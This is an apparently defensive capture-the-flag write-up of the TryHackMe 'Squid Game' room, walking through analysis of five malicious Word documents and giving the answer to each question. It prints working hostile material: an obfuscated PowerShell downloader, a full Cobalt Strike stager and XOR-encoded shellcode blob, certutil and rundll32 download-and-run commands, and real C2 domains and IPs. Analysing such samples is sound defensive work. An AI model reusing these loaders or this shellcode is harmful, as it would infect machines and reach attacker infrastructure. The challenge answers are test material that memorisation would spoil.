# [Squid Game](https://tryhackme.com/room/squidgameroom)

## 오징어 게임

# Scenario

**Invitation Received**

You have an invitation to play a **Squid Game**.

In this game, you will have to play the defensive role and eliminate five attackers. Let us tell you before the game starts; this is not going to be easy. Less hints are provided in this room to challenge you. You won't believe it, but sometimes the best way to learn is to do your own research and come up with your own approach to solve the challenges. You will have all the necessary tools needed in the Lab Machine to complete the challenge.

We look forward to your writeups!

**What is the prize for the winner?**

You will get the credits for being awesome and also take away a bunch of knowledge.

And, on the final note, let the game begin!

# Attacker 1

**Attacker 1** will give you a warm-up before the hardest yet to come challenge... Try to push Attacker 1 outside the lines.

Good Luck!

### What is the malicious C2 domain you found in the maldoc where an executable download was attempted?

1. Find the macro stream:

```bash
oledump.py attacker1.doc
```

Streams flagged `M` contain VBA. Dump it to confirm the `Shell` call reads its command from a shape's alt text field:

```bash
oledump.py -s 8 -v attacker1.doc
```

2. Extract the alt text directly from the binary file:

```bash
python3 -c "
data = open('attacker1.doc','rb').read()
idx = data.find('h9mkae7'.encode('utf-16-le'))
chunk = data[idx:idx+8000]
print(chunk.decode('utf-16-le', errors='ignore'))
"
```

This reveals an obfuscated PowerShell `-encodedcommand` string with `^` and `[` inserted as junk characters.

3. Clean and decode the payload:

```bash
python3 -c "
import base64
text = 'h9mkae7P^O^W^E^R^S^H^E^L^L ^-^N^o^P^r^o^f^i^l^e^ -^E^x^e^cutionPolicy B^^^yp^ass -encodedcommand J[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[EE[YwB0[Gk[dgBh[HQ[bwBy[F0[Og[6[EM[cgBl[GE[d[Bl[Ek[bgBz[HQ[YQBu[GM[ZQ[o[CI[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[CI[KQ[7[[0[Cg[k[G0[ZQB0[Gg[bwBk[C[[PQ[g[Fs[UwB5[HM[d[Bl[G0[LgBO[GU[d[[u[Fc[ZQBi[EM[b[Bp[GU[bgB0[F0[LgBH[GU[d[BN[GU[d[Bo[G8[Z[Bz[Cg[KQ[7[[0[CgBm[G8[cgBl[GE[YwBo[Cg[J[Bt[C[[aQBu[C[[J[Bt[GU[d[Bo[G8[Z[[p[Hs[DQ[K[[0[Cg[g[C[[aQBm[Cg[J[Bt[C4[TgBh[G0[ZQ[g[C0[ZQBx[C[[IgBE[G8[dwBu[Gw[bwBh[GQ[UwB0[HI[aQBu[Gc[Ig[p[Hs[DQ[K[C[[I[[g[C[[d[By[Hk[ew[N[[o[I[[g[C[[I[[g[CQ[dQBy[Gk[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[FM[eQBz[HQ[ZQBt[C4[VQBy[Gk[K[[i[Gg[d[B0[H[[Og[v[C8[MQ[3[DY[Lg[z[DI[Lg[z[DU[Lg[x[DY[Lw[3[D[[N[Bl[C4[c[Bo[H[[Ig[p[[0[Cg[g[C[[I[[g[C[[SQBF[Fg[K[[k[G0[LgBJ[G4[dgBv[Gs[ZQ[o[CQ[aQBu[HM[d[Bh[G4[YwBl[Cw[I[[o[CQ[dQBy[Gk[KQ[p[Ck[Ow[N[[o[I[[g[C[[I[B9[GM[YQB0[GM[a[B7[H0[DQ[K[[0[Cg[g[C[[fQ[N[[o[DQ[K[C[[I[Bp[GY[K[[k[G0[LgBO[GE[bQBl[C[[LQBl[HE[I[[i[EQ[bwB3[G4[b[Bv[GE[Z[BE[GE[d[Bh[CI[KQB7[[0[Cg[g[C[[I[[g[C[[d[By[Hk[ew[N[[o[I[[g[C[[I[[g[CQ[dQBy[Gk[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[FM[eQBz[HQ[ZQBt[C4[VQBy[Gk[K[[i[Gg[d[B0[H[[Og[v[C8[ZgBw[GU[d[By[GE[YQBy[GQ[ZQBs[Gw[YQ[u[GI[YQBu[GQ[LwB4[GE[c[Bf[DE[M[[y[GI[LQBB[Fo[MQ[v[Dc[M[[0[GU[LgBw[Gg[c[[/[Gw[PQBs[Gk[d[B0[GU[bg[0[C4[ZwBh[HM[Ig[p[[0[Cg[g[C[[I[[g[C[[J[By[GU[cwBw[G8[bgBz[GU[I[[9[C[[J[Bt[C4[SQBu[HY[bwBr[GU[K[[k[Gk[bgBz[HQ[YQBu[GM[ZQ[s[C[[K[[k[HU[cgBp[Ck[KQ[7[[0[Cg[N[[o[I[[g[C[[I[[g[CQ[c[Bh[HQ[a[[g[D0[I[Bb[FM[eQBz[HQ[ZQBt[C4[RQBu[HY[aQBy[G8[bgBt[GU[bgB0[F0[Og[6[Ec[ZQB0[EY[bwBs[GQ[ZQBy[F[[YQB0[Gg[K[[i[EM[bwBt[G0[bwBu[EE[c[Bw[Gw[aQBj[GE[d[Bp[G8[bgBE[GE[d[Bh[CI[KQ[g[Cs[I[[i[Fw[X[BR[GQ[WgBH[F[[LgBl[Hg[ZQ[i[Ds[DQ[K[C[[I[[g[C[[I[Bb[FM[eQBz[HQ[ZQBt[C4[SQBP[C4[RgBp[Gw[ZQBd[Do[OgBX[HI[aQB0[GU[QQBs[Gw[QgB5[HQ[ZQBz[Cg[J[Bw[GE[d[Bo[Cw[I[[k[HI[ZQBz[H[[bwBu[HM[ZQ[p[Ds[DQ[K[[0[Cg[g[C[[I[[g[C[[J[Bj[Gw[cwBp[GQ[I[[9[C[[TgBl[Hc[LQBP[GI[agBl[GM[d[[g[Ec[dQBp[GQ[I[[n[EM[M[[4[EE[RgBE[Dk[M[[t[EY[MgBB[DE[LQ[x[DE[R[[x[C0[O[[0[DU[NQ[t[D[[M[BB[D[[Qw[5[DE[Rg[z[Dg[O[[w[Cc[DQ[K[C[[I[[g[C[[I[[k[HQ[eQBw[GU[I[[9[C[[WwBU[Hk[c[Bl[F0[Og[6[Ec[ZQB0[FQ[eQBw[GU[RgBy[G8[bQBD[Ew[UwBJ[EQ[K[[k[GM[b[Bz[Gk[Z[[p[[0[Cg[g[C[[I[[g[C[[J[Bv[GI[agBl[GM[d[[g[D0[I[Bb[EE[YwB0[Gk[dgBh[HQ[bwBy[F0[Og[6[EM[cgBl[GE[d[Bl[Ek[bgBz[HQ[YQBu[GM[ZQ[o[CQ[d[B5[H[[ZQ[p[[0[Cg[g[C[[I[[g[C[[J[Bv[GI[agBl[GM[d[[u[EQ[bwBj[HU[bQBl[G4[d[[u[EE[c[Bw[Gw[aQBj[GE[d[Bp[G8[bg[u[FM[a[Bl[Gw[b[BF[Hg[ZQBj[HU[d[Bl[Cg[J[Bw[GE[d[Bo[Cw[J[Bu[HU[b[[s[C[[J[Bu[HU[b[[s[C[[J[Bu[HU[b[[s[D[[KQ[N[[o[DQ[K[C[[I[[g[C[[I[B9[GM[YQB0[GM[a[B7[H0[DQ[K[C[[I[[g[C[[I[[N[[o[I[[g[H0[DQ[K[H0[DQ[K[[0[CgBF[Hg[aQB0[Ds[DQ[K[[0[Cg[='
cleaned = text.replace('^', '').replace('[', 'A')
b64 = cleaned.split('encodedcommand ')[-1].strip()
b64p = b64 + '=' * ((4 - len(b64) % 4) % 4)
raw = base64.b64decode(b64p)
print(raw.decode('utf-16-le', errors='ignore'))
"
```

4. The decoded script contains two URIs. The domain used for the exe-drop stage is the answer.

**Answer:** `fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas`

---

### What executable file is the maldoc trying to drop?

1. In the decoded PowerShell from above, find the `WriteAllBytes` call. The filename is built into the `$path` variable right before it.

**Answer:** `QdZGP.exe`

---

### In what folder is it dropping the malicious executable? (hint: %Folder%)

1. Same decoded script. `[System.Environment]::GetFolderPath("CommonApplicationData")` maps to the `%ProgramData%` environment variable on Windows.

**Answer:** `%ProgramData%`

---

### Provide the name of the COM object the maldoc is trying to access.

_Hint: Check clsid field_

1. In the decoded script, pull the GUID and look up CLSID

It resolves to the `ShellBrowserWindow` object, a known technique for launching processes via `.Document.Application.ShellExecute` while evading typical parent-process detection.

**Answer:** `ShellBrowserWindow`

---

### Include the malicious IP and the php extension found in the maldoc. (Format: IP/name.php)

1. Same decoded script, the first URI is IP-based rather than domain-based:

**Answer:** `176.32.35.16/704e.php`

---

### Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx)

1. Check document metadata:

```bash
file attacker1.doc
```

The phone number sits in the Author field.

**Answer:** `213-446-1757`

---

### Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.

_Hint: Use olevba_

1. Run:

```bash
olevba attacker1.doc | grep -i -A1 "AutoOpen"
```

The analysis summary table classifies `AutoOpen` under the `AutoExec` category, since it runs automatically without user interaction.

**Answer:** `AutoExec`

---

### Provide the subject for this maldoc. (make sure to remove the extra whitespace)

1. Run:

```bash
file attacker1.doc
```

Read the `Subject:` field and collapse any doubled spaces.

**Answer:** `West Virginia Samanta`

---

### Provide the time when this document was last saved. (Format: YEAR-MONTH-DAY XX:XX:XX)

_Hint: Use oletimes_

1. Run:

```
oletimes attacker1.doc
```

Read the "Modification Time" for the Root entry.

**Answer:** `2019-02-07 23:45:30`

---

### Provide the stream number that contains a macro.

1. Run:

```bash
oledump.py attacker1.doc
```

Streams containing VBA are flagged with an `M` in the left column.

**Answer:** `8`

---

### Provide the name of the stream that contains a macro.

1. Same command, the stream name is listed next to the flagged entry:

```bash
oledump.py attacker1.doc | grep "M "
```

**Answer:** `ThisDocument`

---

# Attacker 2

Uh oh! Looks like you have got the next opponent - `Attacker 2!`

Ready for the challenge?

### Provide the streams (numbers) that contain macros.

1. Run:

```bash
oledump.py attacker2.doc
```

Streams flagged `M` in the left column contain VBA.

**Answer:** `12, 13, 14, 16`

---

### Provide the size (bytes) of the compiled code for the second stream that contains a macro.

1. The second `M` stream is `Module1`. A VBA module stream is made up of a `PerformanceCache` followed by `CompressedSourceCode`. Dump the raw stream:

```bash
oledump.py -s 13 -d attacker2.doc > module1_raw.bin
```

2. The offset where the compressed source starts can't be found by just searching for byte `0x01`, since that byte occurs plenty of times inside the compiled p-code itself. Instead, brute force every `0x01` offset and try decompressing from there using `oletools` own decompression routine. The correct offset is the one that decompresses cleanly into VBA source starting with `Attribute VB_Name`:

```bash
python3 -c "
from oletools.olevba import decompress_stream
data = open('module1_raw.bin','rb').read()
for i in range(len(data)):
    if data[i] == 0x01:
        try:
            result = decompress_stream(bytearray(data[i:]))
            if result[:20].isascii() and b'Attribute' in result[:50]:
                print('Found valid offset:', i)
                break
        except Exception:
            continue
"
```

The offset found is the size of the `PerformanceCache`, i.e. the compiled code.

**Answer:** `13867`

---

### Provide the largest number of bytes found while analyzing the streams.

1. Go back to the full `oledump.py attacker2.doc` listing and compare the sizes of all streams. The `Data` stream is the largest in the file.

**Answer:** `63641`

---

### Find the command located in the ‘fun’ field ( make sure to reverse the string).

1. Decompile stream 16, the same way as above:

```bash
oledump.py -s 16 -d attacker2.doc > bxh_raw.bin
python3 -c "
from oletools.olevba import decompress_stream
data = open('bxh_raw.bin','rb').read()
for i in range(len(data)):
    if data[i] == 0x01:
        try:
            result = decompress_stream(bytearray(data[i:]))
            if result[:20].isascii() and b'Attribute' in result[:50]:
                print(result.decode('utf-8', errors='ignore'))
                break
        except Exception:
            continue
"
```

This is the actual malicious sub, `eFile`. It builds a path with `StrReverse`, pulls a payload from a UserForm control's caption, writes it to disk, then launches it. Reverse the string passed to `Shell`.

**Answer:** `cmd /k cscript.exe C:\ProgramData\pin.vbs`

---

### Provide the first domain found in the maldoc.

1. The value written to `pin.vbs` comes from `QQ1.t2.Caption`, a UserForm control property, not the VBA source itself. That text lives in the form's binary stream. Dump stream 9 and read it as raw bytes:

```bash
oledump.py -s 9 -a attacker2.doc | strings -n 6
```

This surfaces the full VBScript payload, five PowerShell download blocks, each built via string concatenation of `(New-Object System.Net.WebClient).DownloadFile(...)`.

**Answer:** `priyacareers.com/u9hDQN9Yy7g/pt.html`

---

### Provide the second domain found in the maldoc.

1. Same output, second block.

**Answer:** `perfectdemos.com/Gv1iNAuMKZ/pt.html`

---

### Provide the name of the first malicious DLL it retrieves from the C2 server.

1. Each `LLx` block's `DownloadFile` call saves to a numbered DLL in `C:\ProgramData`.

**Answer:** `www1.dll`

---

### How many DLLs does the maldoc retrieve from the domains?

1. Count the `LLx` blocks in the stream 9 dump, one per domain, each dropping its own DLL.

**Answer:** `5`

---

### Provide the path of where the malicious DLLs are getting dropped onto?

1. Same `DownloadFile` calls, second argument.

**Answer:** `C:\ProgramData`

---

### What program is it using to run DLLs?

1. Further down the stream 9 payload, after the downloads and a sleep, each DLL is launched with:

```bash
cmd /c rundll32.exe C:\ProgramData\wwwN.dll,ldr
```

**Answer:** `rundll32.exe`

---

### How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?

1. Right after the five `Ran.Run HH0+LLx` calls, the script waits before running the DLLs:

```sh
WScript.Sleep(15000)
```

**Answer:** `15`

---

### Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).

1. The VBScript containing the download and execution logic lives in the caption of a control on the form, stored in stream 9.

**Answer:** `Macros/Form/o`

---

# Attacker 3

Looks like **Attacker 3** is trying to dominate a home base. Find his weaknesses and eliminate him.

### Provide the executable name being downloaded.

1. Enumerate streams and dump the VBA with `olevba`:

```bash
oledump.py attacker3.doc
olevba attacker3.doc
```

Stream `A3` contains the `autoopen` sub. It makes two `WshShell.run` calls. The first is hardcoded and copies `certutil.exe` to `C:\ProgramData\1.exe`. The second runs the XOR-decoded string `LG`. The drop filename appears in both calls.

**Answer:** `1.exe`

---

### What program is used to run the executable?

1. The first `XN.run` call reveals the technique: it copies `C:\Windows\System32\certutil.exe` to `C:\ProgramData\1.exe` using `set u=tutil` and string substitution to split the recognizable name. So `1.exe` is certutil, and certutil is what downloads and runs the binary.

**Answer:** `Certutil`

---

### Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).

1. Decode the XOR-obfuscated `LG` string. The `h()` function in stream `A10` splits the input on `%`, XORs each integer against key `111`, and concatenates the result. Run the same logic in Python:

```bash
python3 -c "
text = '12%2%11%79%64%12%79%77%28%10%27%79%26%82%26%29%3%73%73%12%14%3%3%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%10%23%10%79%64%74%26%74%49%12%49%14%49%12%49%7%49%10%49%79%64%9%49%79%7%27%27%31%85%64%64%87%12%9%14%22%25%65%12%0%2%64%13%0%3%13%64%5%14%10%1%27%65%31%7%31%80%3%82%3%6%26%27%89%65%12%14%13%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%79%73%73%79%12%14%3%3%79%29%10%8%28%25%29%92%93%79%44%85%51%63%29%0%8%29%14%2%43%14%27%14%51%94%65%27%2%31%77'
result = ''.join(chr(int(x) ^ 111) for x in text.split('%'))
print(result)
"
```

After CMD expands `%u%=url` and strips the `^` escape characters, the certutil switch becomes `/urlcache /f`, a standard LOLBin download cradle. The `^` characters between each letter of `/urlcache` split the string to defeat simple signature matching.

**Answer:** `8cfayv.com/bolb/jaent.php?l=liut6.cab`

---

### What folder does the binary gets dropped in?

1. Both the certutil download call and the hardcoded copy target `C:\ProgramData` as the drop directory.

**Answer:** `ProgramData`

---

### Which stream executes the binary that was downloaded?

1. The `autoopen` sub that issues both `WshShell.run` calls lives in stream `A3`.

**Answer:** `A3`

---

# Attacker 4

You are very close to the finish line, but the **Attacker 4** is still standing in your way. Don't let him win!

### Provide the first decoded string found in this maldoc.

1. Enumerate streams and dump the macro:

```bash
oledump.py attacker4.doc
olevba attacker4.doc
```

Stream 7 contains two custom helper functions: `Hextostring` and `XORI`. Every obfuscated call follows the pattern `XORI(Hextostring(ciphertext), Hextostring(key))`.

The first call in the macro is:

```
Set VPBCRFOQENN = CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267417269")))
```

Decode the key hex to ASCII, then XOR it against the decoded ciphertext bytes.

**Answer:** `MSXML2.XMLHTTP`

---

### Provide the name of the binary being dropped.

_Hint: Manually "unXOR" using the key you found_

1. The `IOWZJGNTSGK` sub calls `ZUWSBYDOTWV` with two arguments, a URL and a destination path. The destination path is built from two `XORI(Hextostring(...), Hextostring(...))` calls:

```
Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))
```

The first pair decodes to `TEMP`. The second pair, using key `MsBCAFq`, decodes to the filename.

**Answer:** `DYIATHUQLCW.exe`

---

### Provide the folder where the binary is being dropped to.

1. Same decode as above. `Environ("TEMP")` resolves to the user's temp directory.

**Answer:** `TEMP`

---

### Provide the name of the second binary.

1. The `ZUWSBYDOTWV` function's first argument is the download URL, also built from an `XORI(Hextostring(...), Hextostring(...))` pair:

```
gGHBkj = XORI(Hextostring("1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"), Hextostring("744F50"))
```

Decode the key and XOR it against the ciphertext to recover the full URL. The filename at the end of the path is the answer, distinct from the local dropped filename since this is the name the file has on the C2 server.

**Answer:** `bin.exe`

---

### Provide the full URI from which the second binary was downloaded (exclude http/https).

1. Same decode as above. The full XOR output gives the domain and path.

**Answer:** `gv-roth.de/js/bin.exe`

---

# Attacker 5

Congratulations, my friend! You have made it to the final stage. Remember to use your brain, not your fists, to defeat **Attacker 5**.

You can do it!

### What is the caption you found in the maldoc?

1. Enumerate streams and dump the macro:

```bash
oledump.py attacker5.doc
olevba attacker5.doc
```

The `Caption` property of the UserForm itself lives in stream 6, the VBFrame designer stream:

```bash
oledump.py -s 6 -a attacker5.doc | strings -n 4
```

This prints the plaintext form designer record, which includes the `Caption = "CobaltStrikeIsEverywhere"` assignment for the `CatchMeIfYouCan` form.

**Answer:** `CobaltStrikeIsEverywhere`

---

### What is the XOR decimal value found in the decoded-base64 script?

1. `Module1.bas` shows the entry point:

```
Sub AutoOpen()
    Shell "powershell -nop -w hidden -encodedcommand " & CatchMeIfYouCan.SquidGame.ControlTipText
End Sub
```

`SquidGame.ControlTipText` isn't in the VBA source, it's a property on the form control, stored in the form's binary stream. Extract it directly from the file:

```bash
python3 -c "
import re, base64

with open('attacker5.doc', 'rb') as f:
    data = f.read()

idx = data.find(b'SquidGame')
chunk = data[idx:]

matches = re.findall(rb'[A-Za-z0-9+/=]{100,}', chunk)
b64 = max(matches, key=len).decode()
b64 += '=' * (-len(b64) % 4)

raw = base64.b64decode(b64)
print(raw.decode('utf-16-le', errors='ignore'))
"
```

This decodes to a PowerShell one-liner that gzip-decompresses a second embedded Base64 blob and `IEX`'s it:

```sh
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAA..."));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Decompress that second blob:

```bash
python3 -c "
import base64, gzip
b64 = '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'
raw = base64.b64decode(b64)
print(gzip.decompress(raw).decode('utf-8', errors='ignore'))
" > stage2.ps1
cat stage2.ps1
```

The decompressed script is a reflective shellcode loader. It resolves VirtualAlloc manually via GetProcAddress, then decodes a third Base64 blob ($var_code) with a single-byte XOR loop:

```sh
for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}
```

**Answer:** `35`

---

### Provide the C2 IP address of the Cobalt Strike server.

1. Extract and XOR-decode the shellcode blob from `$var_code` to a raw binary:

```bash
python3 -c "
import base64
b64 = '38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuzPCMjcHNLdKq85dz2yFN4EvFxSyMhQ6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMcElucSP+sQy3QZ6caZyDPAAbKKHkwo8rpqq6kCYXyN9IP0+eVsZ4Rw99v716BXp8CyVfV41jsFco/hc/4tB6shBcGAUikQ2ThLag7XmzI3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxsNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TGAMNbWZ3A2BvcQMRDRMNFhMUERQKLikjYfGBTVSEQE/m/5df5/fpCjFv4/AmAnva1i+w9bmm/76gBU3gUrWNEqwUDynyTlxf7l95KviaPh6R9jbEVpv2FM0QMpSm8v7RafNgBBWMPhjf2BCxziGm5ons/AMwe+yqnMCHFubG65SrMf9AcD7Oaji2SmdUmWXrN05+fgHkQOJ3tzya0EUEZof+sfEqjL55Xf/eaJFjXB1XOVOA9qQo6vhMrOj4HkBuhuOw+ncvfvWR0fMabYHPhfH41OFoliMuF4+BBZc1S3wwN4NgZCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhQVDRITEA0WFQ0bGiMjIyMi'
data = bytearray(base64.b64decode(b64))
for i in range(len(data)):
    data[i] ^= 35
open('shellcode.bin', 'wb').write(data)
"
```

Emulate it:

```bash
speakeasy -t shellcode.bin -r -a x86
```

**Answer:** `176.103.56.89`

---

### Provide the full user-agent found.

1. Same emulator trace. The `HttpSendRequestA` call includes the full header block as an argument.

**Answer:** `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)`

---

### Provide the path value for the Cobalt Strike shellcode.

_Hint: Use the emulator_

1. Same trace, the `HttpOpenRequestA` call's third argument is the URI path requested from the C2, the beacon's checkin path.

**Answer:** `/SjMR`

---

### Provide the port number of the Cobalt Strike C2 Server.

1. Same `InternetConnectA` call. The port argument `0x1f90` converts to decimal.

**Answer:** `8080`

---

### Provide the first two APIs found.

1. Same emulator trace, read top to bottom. The stager resolves `wininet` and opens an internet handle before doing anything else.

**Answer:** `LoadLibraryA, InternetOpenA`
